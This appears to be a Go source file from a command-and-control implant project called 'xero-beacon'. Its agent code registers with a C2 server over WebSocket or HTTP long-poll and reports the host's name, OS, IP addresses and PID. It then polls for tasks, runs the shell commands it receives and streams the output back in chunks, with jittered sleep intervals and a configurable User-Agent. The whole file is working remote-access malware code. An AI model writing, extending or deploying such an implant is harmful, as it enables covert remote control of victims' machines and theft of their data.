package beacon

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"xero-beacon/internal/config"
	"xero-beacon/internal/protocolclient"
	"xero-beacon/internal/shell"
	"xero-beacon/internal/state"
)

const resultChunkBytes = 512 * 1024

type Agent struct {
	Config config.Config
	State  state.RuntimeState
	Client *protocolclient.Client
	HTTP   *http.Client
}

func New(cfg config.Config) (*Agent, error) {
	protocol, err := protocolclient.New(cfg.C2PublicKeyB64)
	if err != nil {
		return nil, err
	}
	runtimeState, err := state.Load(cfg.StatePath)
	if err != nil {
		return nil, err
	}
	return &Agent{
		Config: cfg,
		State:  runtimeState,
		Client: protocol,
		HTTP:   &http.Client{Timeout: 45 * time.Second},
	}, nil
}

func runtimePayload(cfg config.Config) map[string]any {
	return map[string]any{
		"machine_fingerprint_hash": cfg.MachineFingerprintHash,
		"hostname":                 cfg.Hostname,
		"os":                       cfg.OS,
		"architecture":             cfg.Architecture,
		"internal_ip":              cfg.InternalIP,
		"external_ip":              emptyToNil(cfg.ExternalIP),
		"pid":                      cfg.PID,
	}
}

func (a *Agent) cfg() config.Config {
	return a.Config
}

func (a *Agent) Run(ctx context.Context) error {
	cfg := a.cfg()
	for {
		if err := a.RunOnce(ctx); err != nil && cfg.Transport != "websocket" {
			return err
		}
		if cfg.Once {
			return nil
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(SleepDuration(cfg.SleepSeconds, cfg.Jitter)):
		}
	}
}

func (a *Agent) RunOnce(ctx context.Context) error {
	cfg := a.cfg()
	if cfg.Transport != "long-poll" {
		if err := a.runWebSocketCycle(ctx); err == nil || !cfg.FallbackLongPollEnabled {
			return err
		}
	}
	if a.State.BeaconID == "" && cfg.ColdStartRestFallback {
		if err := a.restRegister(ctx); err != nil {
			return err
		}
	}
	if a.State.BeaconID == "" {
		return errors.New("long-poll fallback requires a saved beacon identity")
	}
	return a.runLongPollCycle(ctx)
}

func (a *Agent) runWebSocketCycle(ctx context.Context) error {
	cfg := a.cfg()
	dialer := websocket.Dialer{Subprotocols: []string{"xero.beacon.v1"}}
	headers := http.Header{}
	headers.Set("User-Agent", cfg.UserAgent)
	wsURL, err := websocketURL(cfg.C2URL, a.State.BeaconID)
	if err != nil {
		return err
	}
	if a.State.BeaconToken != "" {
		headers.Set("Authorization", "Bearer "+a.State.BeaconToken)
	}
	conn, _, err := dialer.DialContext(ctx, wsURL, headers)
	if err != nil {
		return err
	}
	defer conn.Close()
	if a.State.BeaconID == "" {
		ack, err := a.sendAndReceive(conn, "REGISTER", registerPayload(runtimePayload(a.Config)))
		if err != nil {
			return err
		}
		if err := a.applyRegisterACK(ack); err != nil {
			return err
		}
	}
	if _, err := a.sendAndReceive(conn, "HEARTBEAT", heartbeatPayload(a.State.BeaconID, runtimePayload(a.Config))); err != nil {
		return err
	}
	ack, err := a.sendAndReceive(conn, "TASK_POLL", map[string]any{"beacon_id": a.State.BeaconID})
	if err != nil {
		return err
	}
	return a.executeTaskFromACK(ctx, ack, func(payload map[string]any) error {
		_, err := a.sendAndReceive(conn, "TASK_RESULT", payload)
		return err
	})
}

func (a *Agent) sendAndReceive(conn *websocket.Conn, messageType string, payload map[string]any) (map[string]any, error) {
	frame, err := a.Client.Encode(messageType, payload)
	if err != nil {
		return nil, err
	}
	if err := conn.WriteMessage(websocket.BinaryMessage, frame); err != nil {
		return nil, err
	}
	kind, response, err := conn.ReadMessage()
	if err != nil {
		return nil, err
	}
	if kind != websocket.BinaryMessage {
		return nil, errors.New("expected binary protocol frame")
	}
	decoded, err := a.Client.Decode(response)
	if err != nil {
		return nil, err
	}
	return decoded.Payload, nil
}

func (a *Agent) runLongPollCycle(ctx context.Context) error {
	if err := a.postFrame(ctx, "HEARTBEAT", heartbeatPayload(a.State.BeaconID, runtimePayload(a.Config))); err != nil {
		return err
	}
	req, err := http.NewRequestWithContext(
		ctx,
		http.MethodGet,
		strings.TrimRight(a.cfg().C2URL, "/")+"/api/v1/beacons/"+a.State.BeaconID+"/poll",
		nil,
	)
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+a.State.BeaconToken)
	req.Header.Set("User-Agent", a.cfg().UserAgent)
	response, err := a.HTTP.Do(req)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	if response.StatusCode == http.StatusNoContent {
		return nil
	}
	if response.StatusCode != http.StatusOK {
		return fmt.Errorf("long-poll returned %d", response.StatusCode)
	}
	raw, err := io.ReadAll(response.Body)
	if err != nil {
		return err
	}
	decoded, err := a.Client.Decode(raw)
	if err != nil {
		return err
	}
	return a.executeTaskFromACK(ctx, decoded.Payload, func(payload map[string]any) error {
		return a.postFrame(ctx, "TASK_RESULT", payload)
	})
}

func (a *Agent) postFrame(ctx context.Context, messageType string, payload map[string]any) error {
	frame, err := a.Client.Encode(messageType, payload)
	if err != nil {
		return err
	}
	req, err := http.NewRequestWithContext(
		ctx,
		http.MethodPost,
		strings.TrimRight(a.cfg().C2URL, "/")+"/api/v1/beacons/"+a.State.BeaconID+"/frame",
		bytes.NewReader(frame),
	)
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+a.State.BeaconToken)
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", a.cfg().UserAgent)
	response, err := a.HTTP.Do(req)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return fmt.Errorf("frame POST returned %d", response.StatusCode)
	}
	return nil
}

func (a *Agent) restRegister(ctx context.Context) error {
	content, err := json.Marshal(runtimePayload(a.Config))
	if err != nil {
		return err
	}
	req, err := http.NewRequestWithContext(
		ctx,
		http.MethodPost,
		strings.TrimRight(a.cfg().C2URL, "/")+"/api/v1/beacons/register",
		bytes.NewReader(content),
	)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", a.cfg().UserAgent)
	response, err := a.HTTP.Do(req)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	if response.StatusCode != http.StatusOK {
		return fmt.Errorf("REST register returned %d", response.StatusCode)
	}
	var payload map[string]any
	if err := json.NewDecoder(response.Body).Decode(&payload); err != nil {
		return err
	}
	beaconID, _ := payload["beacon_id"].(string)
	token, _ := payload["beacon_token"].(string)
	if beaconID == "" || token == "" {
		return errors.New("REST register response missing beacon identity")
	}
	a.State.BeaconID = beaconID
	a.State.BeaconToken = token
	return state.Save(a.cfg().StatePath, a.State)
}

func (a *Agent) applyRegisterACK(payload map[string]any) error {
	beaconID, _ := payload["beacon_id"].(string)
	token, _ := payload["beacon_token"].(string)
	if beaconID == "" || token == "" {
		return errors.New("REGISTER ACK missing beacon identity")
	}
	a.State.BeaconID = beaconID
	a.State.BeaconToken = token
	return state.Save(a.cfg().StatePath, a.State)
}

func (a *Agent) executeTaskFromACK(ctx context.Context, ack map[string]any, sendResult func(map[string]any) error) error {
	task, ok := ack["task"].(map[string]any)
	if !ok || task == nil {
		return nil
	}
	taskID, _ := task["id"].(string)
	module, _ := task["module"].(string)
	args, _ := task["args"].(map[string]any)
	if taskID == "" || module != "shell" {
		return nil
	}
	if err := sendResult(map[string]any{
		"beacon_id": a.State.BeaconID,
		"task_id":   taskID,
		"status":    "running",
	}); err != nil {
		return err
	}
	command, _ := args["command"].(string)
	shellType, _ := args["shell_type"].(string)
	timeoutSeconds := numericInt(args["timeout_seconds"], 60)
	done := make(chan shell.Result, 1)
	go func() {
		done <- shell.Run(command, shellType, timeoutSeconds, a.cfg().OutputLimitBytes)
	}()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case result := <-done:
		return a.sendTaskResult(taskID, result, sendResult)
	}
}

func (a *Agent) sendTaskResult(taskID string, result shell.Result, sendResult func(map[string]any) error) error {
	base := map[string]any{
		"beacon_id":  a.State.BeaconID,
		"task_id":    taskID,
		"status":     result.Status,
		"exit_code":  result.ExitCode,
		"timed_out":  result.TimedOut,
		"truncated":  result.Truncated,
		"session_id": a.Client.SessionIDString(),
	}
	if len([]byte(result.Stdout))+len([]byte(result.Stderr)) <= resultChunkBytes {
		base["stdout"] = result.Stdout
		base["stderr"] = result.Stderr
		return sendResult(base)
	}

	uploadID := fmt.Sprintf("%s-%s-%d", a.Client.SessionIDString(), taskID, time.Now().UnixNano())
	streams := []struct {
		name  string
		value string
	}{
		{name: "stdout", value: result.Stdout},
		{name: "stderr", value: result.Stderr},
	}
	chunkedStreams := make([]struct {
		name  string
		value string
	}, 0, len(streams))
	for _, stream := range streams {
		if stream.value != "" {
			chunkedStreams = append(chunkedStreams, stream)
		}
	}
	if len(chunkedStreams) == 0 {
		base["stdout"] = result.Stdout
		base["stderr"] = result.Stderr
		return sendResult(base)
	}

	for streamIndex, stream := range chunkedStreams {
		content := []byte(stream.value)
		totalChunks := (len(content) + resultChunkBytes - 1) / resultChunkBytes
		streamDigest := sha256Hex(content)
		for sequence := 0; sequence < totalChunks; sequence++ {
			start := sequence * resultChunkBytes
			end := start + resultChunkBytes
			if end > len(content) {
				end = len(content)
			}
			chunk := content[start:end]
			payload := cloneMap(base)
			payload["upload_id"] = uploadID
			payload["result_id"] = uploadID
			payload["stream"] = stream.name
			payload["chunk_index"] = sequence
			payload["total_chunks"] = totalChunks
			payload["chunk"] = string(chunk)
			payload["chunk_sha256"] = sha256Hex(chunk)
			payload["stream_sha256"] = streamDigest
			payload["stream_size_bytes"] = len(content)
			payload["result_final"] = streamIndex == len(chunkedStreams)-1 && sequence == totalChunks-1
			if payload["result_final"] == true {
				payload["stdout"] = fallbackStreamValue(result.Stdout, stream.name, "stdout")
				payload["stderr"] = fallbackStreamValue(result.Stderr, stream.name, "stderr")
			}
			if err := sendResult(payload); err != nil {
				return err
			}
		}
	}
	return nil
}

func cloneMap(value map[string]any) map[string]any {
	cloned := make(map[string]any, len(value))
	for key, item := range value {
		cloned[key] = item
	}
	return cloned
}

func fallbackStreamValue(value string, chunkedStream string, targetStream string) string {
	if chunkedStream == targetStream {
		return ""
	}
	if len([]byte(value)) > resultChunkBytes {
		return ""
	}
	return value
}

func sha256Hex(content []byte) string {
	digest := sha256.Sum256(content)
	return hex.EncodeToString(digest[:])
}

func registerPayload(runtime map[string]any) map[string]any {
	payload := heartbeatPayload("", runtime)
	payload["supported_versions"] = []int{1}
	delete(payload, "beacon_id")
	return payload
}

func heartbeatPayload(beaconID string, runtime map[string]any) map[string]any {
	payload := map[string]any{}
	for key, value := range runtime {
		if value != nil {
			payload[key] = value
		}
	}
	if beaconID != "" {
		payload["beacon_id"] = beaconID
	}
	return payload
}

func websocketURL(c2URL string, beaconID string) (string, error) {
	parsed, err := url.Parse(strings.TrimRight(c2URL, "/") + "/ws/beacon")
	if err != nil {
		return "", err
	}
	if parsed.Scheme == "https" {
		parsed.Scheme = "wss"
	} else {
		parsed.Scheme = "ws"
	}
	if beaconID != "" {
		query := parsed.Query()
		query.Set("beacon_id", beaconID)
		parsed.RawQuery = query.Encode()
	}
	return parsed.String(), nil
}

func SleepDuration(seconds int, jitter float64) time.Duration {
	if seconds < 1 {
		seconds = 1
	}
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 1 {
		jitter = 1
	}
	base := float64(seconds)
	window := base * jitter
	offset := 0.0
	if window > 0 {
		offset = rand.Float64()*2*window - window
	}
	return time.Duration((base + offset) * float64(time.Second))
}

func numericInt(value any, fallback int) int {
	switch typed := value.(type) {
	case float64:
		return int(typed)
	case int:
		return typed
	default:
		return fallback
	}
}

func emptyToNil(value string) any {
	if strings.TrimSpace(value) == "" {
		return nil
	}
	return value
}
